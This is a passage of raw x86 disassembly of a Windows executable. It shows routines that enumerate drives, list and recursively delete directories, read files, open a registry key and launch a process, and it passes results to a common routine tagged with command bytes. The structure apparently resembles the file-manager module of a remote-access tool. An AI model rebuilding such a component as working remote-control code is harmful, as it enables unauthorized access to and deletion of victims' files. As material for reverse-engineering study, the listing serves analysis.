  40369f:	85 c0                	test   %eax,%eax
  4036a1:	74 0f                	je     0x4036b2
  4036a3:	5f                   	pop    %edi
  4036a4:	5e                   	pop    %esi
  4036a5:	5d                   	pop    %ebp
  4036a6:	32 c0                	xor    %al,%al
  4036a8:	5b                   	pop    %ebx
  4036a9:	81 c4 54 03 00 00    	add    $0x354,%esp
  4036af:	c2 08 00             	ret    $0x8
  4036b2:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4036b6:	8b 35 38 b0 40 00    	mov    0x40b038,%esi
  4036bc:	8d 54 24 14          	lea    0x14(%esp),%edx
  4036c0:	8d 44 24 6c          	lea    0x6c(%esp),%eax
  4036c4:	52                   	push   %edx
  4036c5:	50                   	push   %eax
  4036c6:	6a 00                	push   $0x0
  4036c8:	51                   	push   %ecx
  4036c9:	ff d6                	call   *%esi
  4036cb:	8b 54 24 10          	mov    0x10(%esp),%edx
  4036cf:	8b 1d 34 b0 40 00    	mov    0x40b034,%ebx
  4036d5:	52                   	push   %edx
  4036d6:	ff d3                	call   *%ebx
  4036d8:	b9 7d 00 00 00       	mov    $0x7d,%ecx
  4036dd:	33 c0                	xor    %eax,%eax
  4036df:	8d bc 24 70 01 00 00 	lea    0x170(%esp),%edi
  4036e6:	f3 ab                	rep stos %eax,%es:(%edi)
  4036e8:	8d 44 24 6c          	lea    0x6c(%esp),%eax
  4036ec:	8d 8c 24 70 01 00 00 	lea    0x170(%esp),%ecx
  4036f3:	50                   	push   %eax
  4036f4:	68 88 e1 40 00       	push   $0x40e188
  4036f9:	51                   	push   %ecx
  4036fa:	ff 15 78 b3 40 00    	call   *0x40b378
  403700:	83 c4 0c             	add    $0xc,%esp
  403703:	8d 54 24 10          	lea    0x10(%esp),%edx
  403707:	8d 84 24 70 01 00 00 	lea    0x170(%esp),%eax
  40370e:	52                   	push   %edx
  40370f:	68 3f 00 0f 00       	push   $0xf003f
  403714:	6a 00                	push   $0x0
  403716:	50                   	push   %eax
  403717:	68 00 00 00 80       	push   $0x80000000
  40371c:	ff d5                	call   *%ebp
  40371e:	85 c0                	test   %eax,%eax
  403720:	74 0f                	je     0x403731
  403722:	5f                   	pop    %edi
  403723:	5e                   	pop    %esi
  403724:	5d                   	pop    %ebp
  403725:	32 c0                	xor    %al,%al
  403727:	5b                   	pop    %ebx
  403728:	81 c4 54 03 00 00    	add    $0x354,%esp
  40372e:	c2 08 00             	ret    $0x8
  403731:	b9 41 00 00 00       	mov    $0x41,%ecx
  403736:	33 c0                	xor    %eax,%eax
  403738:	8d 7c 24 6c          	lea    0x6c(%esp),%edi
  40373c:	8d 54 24 6c          	lea    0x6c(%esp),%edx
  403740:	f3 ab                	rep stos %eax,%es:(%edi)
  403742:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  403746:	c7 44 24 14 04 01 00 	movl   $0x104,0x14(%esp)
  40374d:	00 
  40374e:	51                   	push   %ecx
  40374f:	52                   	push   %edx
  403750:	50                   	push   %eax
  403751:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  403755:	50                   	push   %eax
  403756:	ff d6                	call   *%esi
  403758:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  40375c:	51                   	push   %ecx
  40375d:	ff d3                	call   *%ebx
  40375f:	8b 35 50 b2 40 00    	mov    0x40b250,%esi
  403765:	8d 54 24 6c          	lea    0x6c(%esp),%edx
  403769:	68 84 e1 40 00       	push   $0x40e184
  40376e:	52                   	push   %edx
  40376f:	ff d6                	call   *%esi
  403771:	83 c4 08             	add    $0x8,%esp
  403774:	85 c0                	test   %eax,%eax
  403776:	75 36                	jne    0x4037ae
  403778:	8d 44 24 6c          	lea    0x6c(%esp),%eax
  40377c:	68 80 e1 40 00       	push   $0x40e180
  403781:	50                   	push   %eax
  403782:	ff d6                	call   *%esi
  403784:	83 c4 08             	add    $0x8,%esp
  403787:	85 c0                	test   %eax,%eax
  403789:	75 23                	jne    0x4037ae
  40378b:	8b 35 d0 b0 40 00    	mov    0x40b0d0,%esi
  403791:	8d 4c 24 6c          	lea    0x6c(%esp),%ecx
  403795:	68 7c e1 40 00       	push   $0x40e17c
  40379a:	51                   	push   %ecx
  40379b:	ff d6                	call   *%esi
  40379d:	8b 94 24 68 03 00 00 	mov    0x368(%esp),%edx
  4037a4:	8d 44 24 6c          	lea    0x6c(%esp),%eax
  4037a8:	52                   	push   %edx
  4037a9:	50                   	push   %eax
  4037aa:	ff d6                	call   *%esi
  4037ac:	eb 0f                	jmp    0x4037bd
  4037ae:	8b 8c 24 68 03 00 00 	mov    0x368(%esp),%ecx
  4037b5:	51                   	push   %ecx
  4037b6:	50                   	push   %eax
  4037b7:	ff 15 d4 b0 40 00    	call   *0x40b0d4
  4037bd:	b9 10 00 00 00       	mov    $0x10,%ecx
  4037c2:	33 c0                	xor    %eax,%eax
  4037c4:	8d 7c 24 2c          	lea    0x2c(%esp),%edi
  4037c8:	f3 ab                	rep stos %eax,%es:(%edi)
  4037ca:	8b 84 24 6c 03 00 00 	mov    0x36c(%esp),%eax
  4037d1:	c7 44 24 28 44 00 00 	movl   $0x44,0x28(%esp)
  4037d8:	00 
  4037d9:	85 c0                	test   %eax,%eax
  4037db:	74 08                	je     0x4037e5
  4037dd:	c7 44 24 30 6c e1 40 	movl   $0x40e16c,0x30(%esp)
  4037e4:	00 
  4037e5:	8d 54 24 18          	lea    0x18(%esp),%edx
  4037e9:	8d 44 24 28          	lea    0x28(%esp),%eax
  4037ed:	52                   	push   %edx
  4037ee:	50                   	push   %eax
  4037ef:	6a 00                	push   $0x0
  4037f1:	6a 00                	push   $0x0
  4037f3:	6a 00                	push   $0x0
  4037f5:	6a 00                	push   $0x0
  4037f7:	6a 00                	push   $0x0
  4037f9:	8d 8c 24 88 00 00 00 	lea    0x88(%esp),%ecx
  403800:	6a 00                	push   $0x0
  403802:	51                   	push   %ecx
  403803:	6a 00                	push   $0x0
  403805:	ff 15 0c b1 40 00    	call   *0x40b10c
  40380b:	5f                   	pop    %edi
  40380c:	5e                   	pop    %esi
  40380d:	5d                   	pop    %ebp
  40380e:	5b                   	pop    %ebx
  40380f:	81 c4 54 03 00 00    	add    $0x354,%esp
  403815:	c2 08 00             	ret    $0x8
  403818:	90                   	nop
  403819:	90                   	nop
  40381a:	90                   	nop
  40381b:	90                   	nop
  40381c:	90                   	nop
  40381d:	90                   	nop
  40381e:	90                   	nop
  40381f:	90                   	nop
  403820:	81 ec 84 07 00 00    	sub    $0x784,%esp
  403826:	53                   	push   %ebx
  403827:	8d 84 24 28 01 00 00 	lea    0x128(%esp),%eax
  40382e:	55                   	push   %ebp
  40382f:	50                   	push   %eax
  403830:	89 4c 24 28          	mov    %ecx,0x28(%esp)
  403834:	68 00 01 00 00       	push   $0x100
  403839:	c6 84 24 94 03 00 00 	movb   $0x67,0x394(%esp)
  403840:	67 
  403841:	ff 15 1c b1 40 00    	call   *0x40b11c
  403847:	8a 84 24 2c 01 00 00 	mov    0x12c(%esp),%al
  40384e:	33 d2                	xor    %edx,%edx
  403850:	84 c0                	test   %al,%al
  403852:	8d ac 24 2c 01 00 00 	lea    0x12c(%esp),%ebp
  403859:	89 54 24 10          	mov    %edx,0x10(%esp)
  40385d:	89 54 24 14          	mov    %edx,0x14(%esp)
  403861:	89 54 24 18          	mov    %edx,0x18(%esp)
  403865:	89 54 24 1c          	mov    %edx,0x1c(%esp)
  403869:	bb 01 00 00 00       	mov    $0x1,%ebx
  40386e:	0f 84 49 01 00 00    	je     0x4039bd
  403874:	56                   	push   %esi
  403875:	57                   	push   %edi
  403876:	eb 02                	jmp    0x40387a
  403878:	33 d2                	xor    %edx,%edx
  40387a:	b9 41 00 00 00       	mov    $0x41,%ecx
  40387f:	33 c0                	xor    %eax,%eax
  403881:	8d 7c 24 30          	lea    0x30(%esp),%edi
  403885:	68 04 01 00 00       	push   $0x104
  40388a:	f3 ab                	rep stos %eax,%es:(%edi)
  40388c:	8d 4c 24 34          	lea    0x34(%esp),%ecx
  403890:	51                   	push   %ecx
  403891:	52                   	push   %edx
  403892:	52                   	push   %edx
  403893:	52                   	push   %edx
  403894:	52                   	push   %edx
  403895:	52                   	push   %edx
  403896:	55                   	push   %ebp
  403897:	ff 15 18 b1 40 00    	call   *0x40b118
  40389d:	68 10 04 00 00       	push   $0x410
  4038a2:	8d 94 24 38 02 00 00 	lea    0x238(%esp),%edx
  4038a9:	68 60 01 00 00       	push   $0x160
  4038ae:	52                   	push   %edx
  4038af:	68 80 00 00 00       	push   $0x80
  4038b4:	55                   	push   %ebp
  4038b5:	ff 15 e0 b2 40 00    	call   *0x40b2e0
  4038bb:	8b 35 c8 b0 40 00    	mov    0x40b0c8,%esi
  4038c1:	8d 84 24 44 03 00 00 	lea    0x344(%esp),%eax
  4038c8:	50                   	push   %eax
  4038c9:	ff d6                	call   *%esi
  4038cb:	8b f8                	mov    %eax,%edi
  4038cd:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  4038d1:	47                   	inc    %edi
  4038d2:	51                   	push   %ecx
  4038d3:	89 7c 24 2c          	mov    %edi,0x2c(%esp)
  4038d7:	ff d6                	call   *%esi
  4038d9:	40                   	inc    %eax
  4038da:	89 44 24 14          	mov    %eax,0x14(%esp)
  4038de:	8a 45 00             	mov    0x0(%ebp),%al
  4038e1:	3c 41                	cmp    $0x41,%al
  4038e3:	74 47                	je     0x40392c
  4038e5:	3c 42                	cmp    $0x42,%al
  4038e7:	74 43                	je     0x40392c
  4038e9:	8d 54 24 18          	lea    0x18(%esp),%edx
  4038ed:	6a 00                	push   $0x0
  4038ef:	8d 44 24 24          	lea    0x24(%esp),%eax
  4038f3:	52                   	push   %edx
  4038f4:	50                   	push   %eax
  4038f5:	55                   	push   %ebp
  4038f6:	ff 15 14 b1 40 00    	call   *0x40b114
  4038fc:	85 c0                	test   %eax,%eax
  4038fe:	74 2c                	je     0x40392c
  403900:	8b 44 24 18          	mov    0x18(%esp),%eax
  403904:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  403908:	b9 14 00 00 00       	mov    $0x14,%ecx
  40390d:	e8 5e 6e 00 00       	call   0x40a770
  403912:	8b 54 24 24          	mov    0x24(%esp),%edx
  403916:	8b f0                	mov    %eax,%esi
  403918:	8b 44 24 20          	mov    0x20(%esp),%eax
  40391c:	b9 14 00 00 00       	mov    $0x14,%ecx
  403921:	e8 4a 6e 00 00       	call   0x40a770
  403926:	89 44 24 10          	mov    %eax,0x10(%esp)
  40392a:	eb 06                	jmp    0x403932
  40392c:	33 f6                	xor    %esi,%esi
  40392e:	89 74 24 10          	mov    %esi,0x10(%esp)
  403932:	8a 4d 00             	mov    0x0(%ebp),%cl
  403935:	55                   	push   %ebp
  403936:	88 8c 1c 98 03 00 00 	mov    %cl,0x398(%esp,%ebx,1)
  40393d:	ff 15 10 b1 40 00    	call   *0x40b110
  403943:	8b 54 24 10          	mov    0x10(%esp),%edx
  403947:	8b cf                	mov    %edi,%ecx
  403949:	88 84 1c 95 03 00 00 	mov    %al,0x395(%esp,%ebx,1)
  403950:	8b c1                	mov    %ecx,%eax
  403952:	89 b4 1c 96 03 00 00 	mov    %esi,0x396(%esp,%ebx,1)
  403959:	8d b4 24 44 03 00 00 	lea    0x344(%esp),%esi
  403960:	8d bc 1c 9e 03 00 00 	lea    0x39e(%esp,%ebx,1),%edi
  403967:	89 94 1c 9a 03 00 00 	mov    %edx,0x39a(%esp,%ebx,1)
  40396e:	c1 e9 02             	shr    $0x2,%ecx
  403971:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403973:	8b c8                	mov    %eax,%ecx
  403975:	8b 44 24 28          	mov    0x28(%esp),%eax
  403979:	83 e1 03             	and    $0x3,%ecx
  40397c:	55                   	push   %ebp
  40397d:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40397f:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  403983:	8d 14 18             	lea    (%eax,%ebx,1),%edx
  403986:	8d 74 24 34          	lea    0x34(%esp),%esi
  40398a:	8d bc 14 a2 03 00 00 	lea    0x3a2(%esp,%edx,1),%edi
  403991:	8b d1                	mov    %ecx,%edx
  403993:	c1 e9 02             	shr    $0x2,%ecx
  403996:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403998:	8b ca                	mov    %edx,%ecx
  40399a:	83 e1 03             	and    $0x3,%ecx
  40399d:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40399f:	8b ca                	mov    %edx,%ecx
  4039a1:	03 c8                	add    %eax,%ecx
  4039a3:	8d 5c 0b 0a          	lea    0xa(%ebx,%ecx,1),%ebx
  4039a7:	ff 15 c8 b0 40 00    	call   *0x40b0c8
  4039ad:	8d 6c 28 01          	lea    0x1(%eax,%ebp,1),%ebp
  4039b1:	80 7d 00 00          	cmpb   $0x0,0x0(%ebp)
  4039b5:	0f 85 bd fe ff ff    	jne    0x403878
  4039bb:	5f                   	pop    %edi
  4039bc:	5e                   	pop    %esi
  4039bd:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  4039c1:	8d 94 24 8c 03 00 00 	lea    0x38c(%esp),%edx
  4039c8:	53                   	push   %ebx
  4039c9:	52                   	push   %edx
  4039ca:	e8 d1 25 00 00       	call   0x405fa0
  4039cf:	5d                   	pop    %ebp
  4039d0:	5b                   	pop    %ebx
  4039d1:	81 c4 84 07 00 00    	add    $0x784,%esp
  4039d7:	c3                   	ret
  4039d8:	90                   	nop
  4039d9:	90                   	nop
  4039da:	90                   	nop
  4039db:	90                   	nop
  4039dc:	90                   	nop
  4039dd:	90                   	nop
  4039de:	90                   	nop
  4039df:	90                   	nop
  4039e0:	81 ec 54 02 00 00    	sub    $0x254,%esp
  4039e6:	55                   	push   %ebp
  4039e7:	56                   	push   %esi
  4039e8:	57                   	push   %edi
  4039e9:	be 00 28 00 00       	mov    $0x2800,%esi
  4039ee:	8b f9                	mov    %ecx,%edi
  4039f0:	56                   	push   %esi
  4039f1:	6a 40                	push   $0x40
  4039f3:	89 7c 24 20          	mov    %edi,0x20(%esp)
  4039f7:	c7 47 1c 00 00 00 00 	movl   $0x0,0x1c(%edi)
  4039fe:	89 74 24 1c          	mov    %esi,0x1c(%esp)
  403a02:	ff 15 34 b1 40 00    	call   *0x40b134
  403a08:	8b e8                	mov    %eax,%ebp
  403a0a:	8b 84 24 64 02 00 00 	mov    0x264(%esp),%eax
  403a11:	50                   	push   %eax
  403a12:	8d 8c 24 60 01 00 00 	lea    0x160(%esp),%ecx
  403a19:	68 a8 e1 40 00       	push   $0x40e1a8
  403a1e:	51                   	push   %ecx
  403a1f:	ff 15 78 b3 40 00    	call   *0x40b378
  403a25:	83 c4 0c             	add    $0xc,%esp
  403a28:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  403a2c:	8d 84 24 5c 01 00 00 	lea    0x15c(%esp),%eax
  403a33:	52                   	push   %edx
  403a34:	50                   	push   %eax
  403a35:	ff 15 30 b1 40 00    	call   *0x40b130
  403a3b:	83 f8 ff             	cmp    $0xffffffff,%eax
  403a3e:	89 44 24 10          	mov    %eax,0x10(%esp)
  403a42:	75 1f                	jne    0x403a63
  403a44:	8d 4c 24 0f          	lea    0xf(%esp),%ecx
  403a48:	6a 01                	push   $0x1
  403a4a:	51                   	push   %ecx
  403a4b:	8b cf                	mov    %edi,%ecx
  403a4d:	c6 44 24 17 68       	movb   $0x68,0x17(%esp)
  403a52:	e8 49 25 00 00       	call   0x405fa0
  403a57:	5f                   	pop    %edi
  403a58:	5e                   	pop    %esi
  403a59:	5d                   	pop    %ebp
  403a5a:	81 c4 54 02 00 00    	add    $0x254,%esp
  403a60:	c2 04 00             	ret    $0x4
  403a63:	53                   	push   %ebx
  403a64:	c6 45 00 68          	movb   $0x68,0x0(%ebp)
  403a68:	bb 01 00 00 00       	mov    $0x1,%ebx
  403a6d:	eb 04                	jmp    0x403a73
  403a6f:	8b 74 24 18          	mov    0x18(%esp),%esi
  403a73:	8d 96 f8 fd ff ff    	lea    -0x208(%esi),%edx
  403a79:	3b da                	cmp    %edx,%ebx
  403a7b:	76 16                	jbe    0x403a93
  403a7d:	81 c6 08 02 00 00    	add    $0x208,%esi
  403a83:	6a 42                	push   $0x42
  403a85:	56                   	push   %esi
  403a86:	55                   	push   %ebp
  403a87:	89 74 24 24          	mov    %esi,0x24(%esp)
  403a8b:	ff 15 2c b1 40 00    	call   *0x40b12c
  403a91:	8b e8                	mov    %eax,%ebp
  403a93:	bf a4 e1 40 00       	mov    $0x40e1a4,%edi
  403a98:	8d 74 24 4c          	lea    0x4c(%esp),%esi
  403a9c:	8a 0e                	mov    (%esi),%cl
  403a9e:	8a 17                	mov    (%edi),%dl
  403aa0:	8a c1                	mov    %cl,%al
  403aa2:	3a ca                	cmp    %dl,%cl
  403aa4:	75 1e                	jne    0x403ac4
  403aa6:	84 c0                	test   %al,%al
  403aa8:	74 16                	je     0x403ac0
  403aaa:	8a 56 01             	mov    0x1(%esi),%dl
  403aad:	8a 4f 01             	mov    0x1(%edi),%cl
  403ab0:	8a c2                	mov    %dl,%al
  403ab2:	3a d1                	cmp    %cl,%dl
  403ab4:	75 0e                	jne    0x403ac4
  403ab6:	83 c6 02             	add    $0x2,%esi
  403ab9:	83 c7 02             	add    $0x2,%edi
  403abc:	84 c0                	test   %al,%al
  403abe:	75 dc                	jne    0x403a9c
  403ac0:	33 c0                	xor    %eax,%eax
  403ac2:	eb 05                	jmp    0x403ac9
  403ac4:	1b c0                	sbb    %eax,%eax
  403ac6:	83 d8 ff             	sbb    $0xffffffff,%eax
  403ac9:	85 c0                	test   %eax,%eax
  403acb:	0f 84 92 00 00 00    	je     0x403b63
  403ad1:	bf a0 e1 40 00       	mov    $0x40e1a0,%edi
  403ad6:	8d 74 24 4c          	lea    0x4c(%esp),%esi
  403ada:	8a 0e                	mov    (%esi),%cl
  403adc:	8a 17                	mov    (%edi),%dl
  403ade:	8a c1                	mov    %cl,%al
  403ae0:	3a ca                	cmp    %dl,%cl
  403ae2:	75 1e                	jne    0x403b02
  403ae4:	84 c0                	test   %al,%al
  403ae6:	74 16                	je     0x403afe
  403ae8:	8a 56 01             	mov    0x1(%esi),%dl
  403aeb:	8a 4f 01             	mov    0x1(%edi),%cl
  403aee:	8a c2                	mov    %dl,%al
  403af0:	3a d1                	cmp    %cl,%dl
  403af2:	75 0e                	jne    0x403b02
  403af4:	83 c6 02             	add    $0x2,%esi
  403af7:	83 c7 02             	add    $0x2,%edi
  403afa:	84 c0                	test   %al,%al
  403afc:	75 dc                	jne    0x403ada
  403afe:	33 c0                	xor    %eax,%eax
  403b00:	eb 05                	jmp    0x403b07
  403b02:	1b c0                	sbb    %eax,%eax
  403b04:	83 d8 ff             	sbb    $0xffffffff,%eax
  403b07:	85 c0                	test   %eax,%eax
  403b09:	74 58                	je     0x403b63
  403b0b:	8a 44 24 20          	mov    0x20(%esp),%al
  403b0f:	8d 4c 24 4c          	lea    0x4c(%esp),%ecx
  403b13:	24 10                	and    $0x10,%al
  403b15:	51                   	push   %ecx
  403b16:	88 04 2b             	mov    %al,(%ebx,%ebp,1)
  403b19:	43                   	inc    %ebx
  403b1a:	ff 15 c8 b0 40 00    	call   *0x40b0c8
  403b20:	8b c8                	mov    %eax,%ecx
  403b22:	8d 74 24 4c          	lea    0x4c(%esp),%esi
  403b26:	8b d1                	mov    %ecx,%edx
  403b28:	8d 3c 2b             	lea    (%ebx,%ebp,1),%edi
  403b2b:	c1 e9 02             	shr    $0x2,%ecx
  403b2e:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403b30:	8b ca                	mov    %edx,%ecx
  403b32:	03 d8                	add    %eax,%ebx
  403b34:	83 e1 03             	and    $0x3,%ecx
  403b37:	43                   	inc    %ebx
  403b38:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  403b3a:	c6 44 2b ff 00       	movb   $0x0,-0x1(%ebx,%ebp,1)
  403b3f:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  403b43:	89 04 2b             	mov    %eax,(%ebx,%ebp,1)
  403b46:	8b 4c 24 40          	mov    0x40(%esp),%ecx
  403b4a:	89 4c 2b 04          	mov    %ecx,0x4(%ebx,%ebp,1)
  403b4e:	8b 54 24 34          	mov    0x34(%esp),%edx
  403b52:	83 c3 08             	add    $0x8,%ebx
  403b55:	89 14 2b             	mov    %edx,(%ebx,%ebp,1)
  403b58:	8b 44 24 38          	mov    0x38(%esp),%eax
  403b5c:	89 44 2b 04          	mov    %eax,0x4(%ebx,%ebp,1)
  403b60:	83 c3 08             	add    $0x8,%ebx
  403b63:	8b 54 24 14          	mov    0x14(%esp),%edx
  403b67:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  403b6b:	51                   	push   %ecx
  403b6c:	52                   	push   %edx
  403b6d:	ff 15 28 b1 40 00    	call   *0x40b128
  403b73:	85 c0                	test   %eax,%eax
  403b75:	0f 85 f4 fe ff ff    	jne    0x403a6f
  403b7b:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  403b7f:	53                   	push   %ebx
  403b80:	55                   	push   %ebp
  403b81:	e8 1a 24 00 00       	call   0x405fa0
  403b86:	55                   	push   %ebp
  403b87:	8b f0                	mov    %eax,%esi
  403b89:	ff 15 24 b1 40 00    	call   *0x40b124
  403b8f:	8b 44 24 14          	mov    0x14(%esp),%eax
  403b93:	50                   	push   %eax
  403b94:	ff 15 20 b1 40 00    	call   *0x40b120
  403b9a:	5b                   	pop    %ebx
  403b9b:	8b c6                	mov    %esi,%eax
  403b9d:	5f                   	pop    %edi
  403b9e:	5e                   	pop    %esi
  403b9f:	5d                   	pop    %ebp
  403ba0:	81 c4 54 02 00 00    	add    $0x254,%esp
  403ba6:	c2 04 00             	ret    $0x4
  403ba9:	90                   	nop
  403baa:	90                   	nop
  403bab:	90                   	nop
  403bac:	90                   	nop
  403bad:	90                   	nop
  403bae:	90                   	nop
  403baf:	90                   	nop
  403bb0:	81 ec 4c 04 00 00    	sub    $0x44c,%esp
  403bb6:	8d 84 24 48 03 00 00 	lea    0x348(%esp),%eax
  403bbd:	53                   	push   %ebx
  403bbe:	55                   	push   %ebp
  403bbf:	56                   	push   %esi
  403bc0:	8b b4 24 5c 04 00 00 	mov    0x45c(%esp),%esi
  403bc7:	57                   	push   %edi
  403bc8:	8b 3d 78 b3 40 00    	mov    0x40b378,%edi
  403bce:	56                   	push   %esi
  403bcf:	68 a8 e1 40 00       	push   $0x40e1a8
  403bd4:	8b e9                	mov    %ecx,%ebp
  403bd6:	50                   	push   %eax
  403bd7:	ff d7                	call   *%edi
  403bd9:	83 c4 0c             	add    $0xc,%esp
  403bdc:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  403be0:	8d 94 24 58 03 00 00 	lea    0x358(%esp),%edx
  403be7:	51                   	push   %ecx
  403be8:	52                   	push   %edx
  403be9:	ff 15 30 b1 40 00    	call   *0x40b130
  403bef:	8b d8                	mov    %eax,%ebx
  403bf1:	83 fb ff             	cmp    $0xffffffff,%ebx
  403bf4:	75 0f                	jne    0x403c05
  403bf6:	5f                   	pop    %edi
  403bf7:	5e                   	pop    %esi
  403bf8:	5d                   	pop    %ebp
  403bf9:	32 c0                	xor    %al,%al
  403bfb:	5b                   	pop    %ebx
  403bfc:	81 c4 4c 04 00 00    	add    $0x44c,%esp
  403c02:	c2 04 00             	ret    $0x4
  403c05:	80 7c 24 3c 2e       	cmpb   $0x2e,0x3c(%esp)
  403c0a:	74 4b                	je     0x403c57
  403c0c:	f6 44 24 10 10       	testb  $0x10,0x10(%esp)
  403c11:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  403c15:	50                   	push   %eax
  403c16:	56                   	push   %esi
  403c17:	68 5c e0 40 00       	push   $0x40e05c
  403c1c:	74 1e                	je     0x403c3c
  403c1e:	8d 8c 24 5c 01 00 00 	lea    0x15c(%esp),%ecx
  403c25:	51                   	push   %ecx
  403c26:	ff d7                	call   *%edi
  403c28:	83 c4 10             	add    $0x10,%esp
  403c2b:	8d 94 24 50 01 00 00 	lea    0x150(%esp),%edx
  403c32:	8b cd                	mov    %ebp,%ecx
  403c34:	52                   	push   %edx
  403c35:	e8 76 ff ff ff       	call   0x403bb0
  403c3a:	eb 1b                	jmp    0x403c57
  403c3c:	8d 8c 24 60 02 00 00 	lea    0x260(%esp),%ecx
  403c43:	51                   	push   %ecx
  403c44:	ff d7                	call   *%edi
  403c46:	83 c4 10             	add    $0x10,%esp
  403c49:	8d 94 24 54 02 00 00 	lea    0x254(%esp),%edx
  403c50:	52                   	push   %edx
  403c51:	ff 15 fc b0 40 00    	call   *0x40b0fc
  403c57:	8d 44 24 10          	lea    0x10(%esp),%eax
  403c5b:	50                   	push   %eax
  403c5c:	53                   	push   %ebx
  403c5d:	ff 15 28 b1 40 00    	call   *0x40b128
  403c63:	85 c0                	test   %eax,%eax
  403c65:	75 9e                	jne    0x403c05
  403c67:	53                   	push   %ebx
  403c68:	ff 15 20 b1 40 00    	call   *0x40b120
  403c6e:	56                   	push   %esi
  403c6f:	ff 15 38 b1 40 00    	call   *0x40b138
  403c75:	5f                   	pop    %edi
  403c76:	5e                   	pop    %esi
  403c77:	85 c0                	test   %eax,%eax
  403c79:	5d                   	pop    %ebp
  403c7a:	5b                   	pop    %ebx
  403c7b:	0f 95 c0             	setne  %al
  403c7e:	81 c4 4c 04 00 00    	add    $0x44c,%esp
  403c84:	c2 04 00             	ret    $0x4
  403c87:	90                   	nop
  403c88:	90                   	nop
  403c89:	90                   	nop
  403c8a:	90                   	nop
  403c8b:	90                   	nop
  403c8c:	90                   	nop
  403c8d:	90                   	nop
  403c8e:	90                   	nop
  403c8f:	90                   	nop
  403c90:	83 ec 08             	sub    $0x8,%esp
  403c93:	53                   	push   %ebx
  403c94:	56                   	push   %esi
  403c95:	8d 51 20             	lea    0x20(%ecx),%edx
  403c98:	57                   	push   %edi
  403c99:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  403c9d:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  403ca1:	b9 41 00 00 00       	mov    $0x41,%ecx
  403ca6:	33 c0                	xor    %eax,%eax
  403ca8:	8b fa                	mov    %edx,%edi
  403caa:	6a 00                	push   $0x0
  403cac:	f3 ab                	rep stos %eax,%es:(%edi)
  403cae:	8b fb                	mov    %ebx,%edi
  403cb0:	83 c9 ff             	or     $0xffffffff,%ecx
  403cb3:	f2 ae                	repnz scas %es:(%edi),%al
  403cb5:	f7 d1                	not    %ecx
  403cb7:	2b f9                	sub    %ecx,%edi
  403cb9:	68 80 00 00 00       	push   $0x80
  403cbe:	8b c1                	mov    %ecx,%eax
  403cc0:	8b f7                	mov    %edi,%esi
  403cc2:	8b fa                	mov    %edx,%edi
  403cc4:	6a 03                	push   $0x3
  403cc6:	c1 e9 02             	shr    $0x2,%ecx
  403cc9:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403ccb:	8b c8                	mov    %eax,%ecx
  403ccd:	6a 00                	push   $0x0
  403ccf:	83 e1 03             	and    $0x3,%ecx
  403cd2:	6a 01                	push   $0x1
  403cd4:	68 00 00 00 80       	push   $0x80000000
  403cd9:	53                   	push   %ebx
  403cda:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  403cdc:	ff 15 40 b1 40 00    	call   *0x40b140
  403ce2:	8b f8                	mov    %eax,%edi
  403ce4:	83 ff ff             	cmp    $0xffffffff,%edi
  403ce7:	75 0b                	jne    0x403cf4
  403ce9:	5f                   	pop    %edi
  403cea:	5e                   	pop    %esi
  403ceb:	33 c0                	xor    %eax,%eax
  403ced:	5b                   	pop    %ebx
  403cee:	83 c4 08             	add    $0x8,%esp
  403cf1:	c2 04 00             	ret    $0x4
  403cf4:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  403cf8:	55                   	push   %ebp
  403cf9:	51                   	push   %ecx
  403cfa:	57                   	push   %edi
  403cfb:	ff 15 3c b1 40 00    	call   *0x40b13c
  403d01:	57                   	push   %edi
  403d02:	8b f0                	mov    %eax,%esi
  403d04:	ff 15 e4 b1 40 00    	call   *0x40b1e4
  403d0a:	53                   	push   %ebx
  403d0b:	ff 15 c8 b0 40 00    	call   *0x40b0c8
  403d11:	8b e8                	mov    %eax,%ebp
  403d13:	83 c5 0a             	add    $0xa,%ebp
  403d16:	55                   	push   %ebp
  403d17:	6a 40                	push   $0x40
  403d19:	ff 15 34 b1 40 00    	call   *0x40b134
  403d1f:	8b cd                	mov    %ebp,%ecx
  403d21:	8b d8                	mov    %eax,%ebx
  403d23:	8b d1                	mov    %ecx,%edx
  403d25:	33 c0                	xor    %eax,%eax
  403d27:	8b fb                	mov    %ebx,%edi
  403d29:	c1 e9 02             	shr    $0x2,%ecx
  403d2c:	f3 ab                	rep stos %eax,%es:(%edi)
  403d2e:	8b ca                	mov    %edx,%ecx
  403d30:	83 e1 03             	and    $0x3,%ecx
  403d33:	f3 aa                	rep stos %al,%es:(%edi)
  403d35:	c6 03 69             	movb   $0x69,(%ebx)
  403d38:	8b 44 24 10          	mov    0x10(%esp),%eax
  403d3c:	89 73 05             	mov    %esi,0x5(%ebx)
  403d3f:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  403d43:	56                   	push   %esi
  403d44:	89 43 01             	mov    %eax,0x1(%ebx)
  403d47:	ff 15 c8 b0 40 00    	call   *0x40b0c8
  403d4d:	8b c8                	mov    %eax,%ecx
  403d4f:	8d 7b 09             	lea    0x9(%ebx),%edi
  403d52:	41                   	inc    %ecx
  403d53:	55                   	push   %ebp
  403d54:	8b d1                	mov    %ecx,%edx
  403d56:	53                   	push   %ebx
  403d57:	c1 e9 02             	shr    $0x2,%ecx
  403d5a:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
